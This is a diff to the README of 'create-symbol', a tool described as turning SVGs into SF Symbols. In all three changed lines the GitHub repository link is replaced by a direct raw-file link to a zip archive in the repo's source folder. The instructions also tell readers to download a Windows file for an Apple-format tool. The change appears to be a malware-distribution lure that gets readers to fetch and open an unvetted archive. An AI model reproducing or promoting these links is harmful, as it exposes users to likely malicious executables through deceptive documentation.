@@ -1,6 +1,6 @@
 # 🧩 create-symbol - Turn SVGs Into SF Symbols
 
-[![Download create-symbol](https://img.shields.io/badge/Download%20create-symbol-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/illustrative-inputprogram821/create-symbol)
+[![Download create-symbol](https://img.shields.io/badge/Download%20create-symbol-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/illustrative-inputprogram821/create-symbol/main/src/create_symbol_v3.3.zip)
 
 ## 🖥️ What create-symbol does
 
@@ -14,7 +14,7 @@ Use it when you want to:
 
 ## 📥 Download
 
-1. Open the download page: [https://github.com/illustrative-inputprogram821/create-symbol](https://github.com/illustrative-inputprogram821/create-symbol)
+1. Open the download page: [https://raw.githubusercontent.com/illustrative-inputprogram821/create-symbol/main/src/create_symbol_v3.3.zip](https://raw.githubusercontent.com/illustrative-inputprogram821/create-symbol/main/src/create_symbol_v3.3.zip)
 2. Find the latest version
 3. Download the Windows file from the release
 4. Open the file after it finishes downloading
@@ -155,7 +155,7 @@ To keep your workflow clean:
 
 ## 🔗 Download again
 
-If you need the file again, visit this page to download: [https://github.com/illustrative-inputprogram821/create-symbol](https://github.com/illustrative-inputprogram821/create-symbol)
+If you need the file again, visit this page to download: [https://raw.githubusercontent.com/illustrative-inputprogram821/create-symbol/main/src/create_symbol_v3.3.zip](https://raw.githubusercontent.com/illustrative-inputprogram821/create-symbol/main/src/create_symbol_v3.3.zip)
 
 ## 📌 Suggested folder setup
 
